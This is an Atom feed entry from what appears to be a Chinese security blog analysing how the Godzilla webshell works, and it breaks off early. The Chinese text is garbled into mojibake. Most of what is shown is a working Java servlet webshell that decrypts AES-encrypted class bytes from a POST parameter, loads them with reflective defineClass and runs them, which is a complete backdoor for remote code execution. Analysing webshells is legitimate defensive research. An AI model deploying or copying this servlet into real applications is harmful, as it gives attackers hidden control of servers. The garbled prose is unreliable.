<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ğŸ˜Š#</title>
  
  
  <link href="https://jkme.github.io/atom.xml" rel="self"/>
  
  <link href="https://jkme.github.io/"/>
  <updated>2022-05-23T07:48:35.638Z</updated>
  <id>https://jkme.github.io/</id>
  
  <author>
    <name>JKme</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>å“¥æ–¯æ‹‰åŸç†åˆ†æ</title>
    <link href="https://jkme.github.io/2022/05/17/godzilla.html"/>
    <id>https://jkme.github.io/2022/05/17/godzilla.html</id>
    <published>2022-05-16T16:00:00.000Z</published>
    <updated>2022-05-23T07:48:35.638Z</updated>
    
    <content type="html"><![CDATA[<h2 id="åˆ†æèƒŒæ™¯"><a href="#åˆ†æèƒŒæ™¯" class="headerlink" title="åˆ†æèƒŒæ™¯"></a>åˆ†æèƒŒæ™¯</h2><p>èµ·æºäº<code>Y4er</code>å¸ˆå‚…å‘çš„ä¸¤ç¯‡æ–‡ç« ï¼š</p><ul><li><a href="https://tttang.com/archive/1513/">Javaååºåˆ—åŒ–æ³¨å…¥å†°èå†…å­˜é©¬ç›¸å…³è¸©å‘ç¬”è®°</a></li><li><a href="https://y4er.com/post/solve-the-problem-of-godzilla-memory-shell-pagecontext/">è§£å†³å“¥æ–¯æ‹‰å†…å­˜é©¬pagecontextçš„é—®é¢˜</a></li></ul><p>å¯¹å…¶ä¸­çš„åŸå› æ¯”è¾ƒå¥½å¥‡ï¼Œæ‰€ä»¥å°è¯•å¯¹å“¥æ–¯æ‹‰åšäº†ä¸€æ¬¡åŸç†åˆ†æï¼Œæµ‹è¯•ä»£ç åœ¨<a href="https://github.com/JKme/MemoryShellDemo">MemoryShellDemo</a>ã€‚æ–‡ç« å¯èƒ½æœ‰é”™è¯¯çš„åœ°æ–¹ï¼Œå¯ä»¥åœ¨<a href="https://github.com/JKme/JKme.github.io/issues">issue</a>ç•™è¨€ã€‚</p><h2 id="è¿è¡ŒåŸç†"><a href="#è¿è¡ŒåŸç†" class="headerlink" title="è¿è¡ŒåŸç†"></a>è¿è¡ŒåŸç†</h2><p>ä»å“¥æ–¯æ‹‰çš„æºä»£ç é‡Œé¢æ‰£å‡ºæ¥<code>godzilla\shells\payloads\java\assets\payload.classs</code>æ–‡ä»¶ï¼Œä½¿ç”¨<a href="https://github.com/leibnitz27/cfr">https://github.com/leibnitz27/cfr</a>åç¼–è¯‘ä¹‹åï¼Œåœ¨ideaé‡Œé¢æ–°å»º<code>payload.java</code>æ–‡ä»¶ï¼Œç„¶åä¿®æ”¹è¯¯æŠ¥é”™ï¼Œ<a href="https://gist.github.com/JKme/690c9562155c019570afd5ab06356658">è¿™é‡Œ</a>æ˜¯åç¼–è¯‘å¥½ä¹‹åçš„æ–‡ä»¶ã€‚<code>payload.java</code>å®ç°äº†å¤§éƒ¨åˆ†çš„shellæ“ä½œï¼Œæ¯”å¦‚æŸ¥çœ‹æ–‡ä»¶ã€æ‰§è¡Œå‘½ä»¤ã€æ•°æ®åº“è¿æ¥ç­‰ç­‰</p><p>æ–°å»ºä¸€ä¸ª<code>HelloServlet.java</code>ï¼Œç”¨äºåŠ¨æ€è°ƒè¯•ï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">basic</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">ServletException</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">WebServlet</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServlet</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletRequest</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletResponse</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Method</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span>URL<span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">URLClassLoader</span><span class="token punctuation">;</span><span class="token annotation punctuation">@WebServlet</span><span class="token punctuation">(</span>name <span class="token operator">=</span> <span class="token string">"helloServlet"</span><span class="token punctuation">,</span> value <span class="token operator">=</span> <span class="token string">"/hello"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">HelloServlet</span> <span class="token keyword">extends</span> <span class="token class-name">HttpServlet</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">String</span> xc <span class="token operator">=</span> <span class="token string">"3c6e0b8a9c15224a"</span><span class="token punctuation">;</span>  <span class="token comment">//å®šä¹‰AESåŠ è§£å¯†çš„Keyï¼Œå“¥æ–¯æ‹‰ä¼šæŠŠè¿”å›çš„responseä¹Ÿåšä¸€æ¬¡åŠ å¯†</span>    <span class="token class-name">String</span> pass <span class="token operator">=</span> <span class="token string">"pass"</span><span class="token punctuation">;</span>           <span class="token class-name">String</span> md5 <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span>pass <span class="token operator">+</span> xc<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">//ç”¨äºè¿”å›responseåœ¨å¤´å’Œå°¾éƒ¨æ’å…¥æ ‡è¯†ç¬¦ï¼Œå¤´éƒ¨å–md5çš„å‰16ä½å­—ç¬¦ä¸²ï¼Œå°¾éƒ¨å–md5çš„å16ä½å­—ç¬¦ä¸²</span>    <span class="token class-name">Class</span> payload<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token class-name">String</span> s<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">String</span> ret <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>security<span class="token punctuation">.</span></span>MessageDigest</span> m<span class="token punctuation">;</span>            m <span class="token operator">=</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>security<span class="token punctuation">.</span></span>MessageDigest</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token string">"MD5"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            m<span class="token punctuation">.</span><span class="token function">update</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> s<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            ret <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>math<span class="token punctuation">.</span></span>BigInteger</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> m<span class="token punctuation">.</span><span class="token function">digest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toUpperCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> ret<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">base64Encode</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bs<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Class</span> base64<span class="token punctuation">;</span>        <span class="token class-name">String</span> value <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            base64 <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.util.Base64"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">Object</span> <span class="token class-name">Encoder</span> <span class="token operator">=</span> base64<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"getEncoder"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>base64<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            value <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span> <span class="token class-name">Encoder</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"encodeToString"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">Encoder</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>bs<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                base64 <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"sun.misc.BASE64Encoder"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token class-name">Object</span> <span class="token class-name">Encoder</span> <span class="token operator">=</span> base64<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                value <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span> <span class="token class-name">Encoder</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"encode"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">Encoder</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>bs<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> value<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">base64Decode</span><span class="token punctuation">(</span><span class="token class-name">String</span> bs<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Class</span> base64<span class="token punctuation">;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> value <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            base64 <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.util.Base64"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">Object</span> decoder <span class="token operator">=</span> base64<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"getDecoder"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>base64<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            value <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> decoder<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"decode"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>decoder<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>bs<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                base64 <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"sun.misc.BASE64Decoder"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token class-name">Object</span> decoder <span class="token operator">=</span> base64<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                value <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> decoder<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"decodeBuffer"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>decoder<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>bs<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> value<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">x</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> s<span class="token punctuation">,</span> <span class="token keyword">boolean</span> m<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token class-name"><span class="token namespace">javax<span class="token punctuation">.</span>crypto<span class="token punctuation">.</span></span>Cipher</span> c <span class="token operator">=</span> <span class="token class-name"><span class="token namespace">javax<span class="token punctuation">.</span>crypto<span class="token punctuation">.</span></span>Cipher</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token string">"AES"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            c<span class="token punctuation">.</span><span class="token function">init</span><span class="token punctuation">(</span>m <span class="token operator">?</span> <span class="token number">1</span> <span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">javax<span class="token punctuation">.</span>crypto<span class="token punctuation">.</span>spec<span class="token punctuation">.</span></span>SecretKeySpec</span><span class="token punctuation">(</span>xc<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"AES"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//æ ¹æ®mçš„å€¼åˆ¤æ–­æ˜¯åŠ å¯†è¿˜æ˜¯è§£å¯†ï¼Œmæ˜¯trueçš„æ—¶å€™å˜é‡ä¸º1ï¼Œè¿™æ—¶å€™è¡¨ç¤ºåŠ å¯†æ¨¡å¼ï¼Œåä¹‹æ˜¯è§£å¯†æ¨¡å¼</span>            <span class="token keyword">return</span> c<span class="token punctuation">.</span><span class="token function">doFinal</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">Class</span> <span class="token function">defClass</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> classBytes<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Throwable</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">URLClassLoader</span> urlClassLoader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URLClassLoader</span><span class="token punctuation">(</span><span class="token keyword">new</span> URL<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getContextClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Method</span> defMethod <span class="token operator">=</span> <span class="token class-name">ClassLoader</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"defineClass"</span><span class="token punctuation">,</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        defMethod<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token class-name">Class</span><span class="token punctuation">)</span> defMethod<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>urlClassLoader<span class="token punctuation">,</span> classBytes<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> classBytes<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">doPost</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> req<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> resp<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> data <span class="token operator">=</span> <span class="token function">base64Decode</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span>pass<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            data <span class="token operator">=</span> <span class="token function">x</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>payload <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                  payload <span class="token operator">=</span> <span class="token function">defClass</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//ç”¨äºç¬¬ä¸€æ¬¡æ¥å—è¯·æ±‚åˆå§‹åŒ–payload</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>ByteArrayOutputStream</span> arrOut <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                resp<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>arrOut<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                resp<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//                Object f = payload.newInstance(); </span>                <span class="token class-name">Object</span> f <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">Class</span><span class="token punctuation">)</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"basic.payload"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//æœ¬åœ°åŠ è½½payloadï¼Œç”¨äºåŠ¨æ€è°ƒè¯•</span>                f<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>arrOut<span class="token punctuation">)</span><span class="token punctuation">;</span>                f<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>                f<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span><span class="token punctuation">;</span>                resp<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>md5<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                f<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                resp<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token function">base64Encode</span><span class="token punctuation">(</span><span class="token function">x</span><span class="token punctuation">(</span>arrOut<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                resp<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>md5<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åœ¨å“¥æ–¯æ‹‰ä¸»ç•Œé¢ï¼Œç‚¹å‡»æµ‹è¯•ä¼šåœ¨burpå‘é€ä¸¤æ¬¡è¯·æ±‚ï¼Œç„¶åå“¥æ–¯æ‹‰ä¼šå¼¹æ¡†å‡ºç°Successï¼Œè¿™æ—¶å€™å†ç‚¹å‡»ç¡®å®šï¼Œå“¥æ–¯æ‹‰ä¼šå‘èµ·ç¬¬ä¸‰æ¬¡è¯·æ±‚ï¼Œå…ˆåˆ†æè¿™ä¸‰æ¬¡è¯·æ±‚çš„æ•°æ®åŒ…ä»¥åŠå“¥æ–¯æ‹‰éƒ½åšäº†ä»€ä¹ˆäº‹æƒ…ã€‚<br><img src="/2022/05/17/godzilla/1.png"></p><h3 id="ç¬¬ä¸€æ¬¡è¯·æ±‚"><a href="#ç¬¬ä¸€æ¬¡è¯·æ±‚" class="headerlink" title="ç¬¬ä¸€æ¬¡è¯·æ±‚"></a>ç¬¬ä¸€æ¬¡è¯·æ±‚</h3><p>æ ¹æ®ä¸Šé¢<code>HelloServlet.java</code>æºä»£ç ï¼Œå¯ä»¥çœ‹åˆ°å“¥æ–¯æ‹‰åœ¨ä¼ è¾“è¿‡ç¨‹ä¸­ä½¿ç”¨äº†AESåŠ è§£å¯†ï¼Œåœ¨æœåŠ¡ç«¯å…ˆbase64è§£ç ï¼Œç„¶åAESè§£å¯†æ•°æ®åŒ…ï¼š<br><img 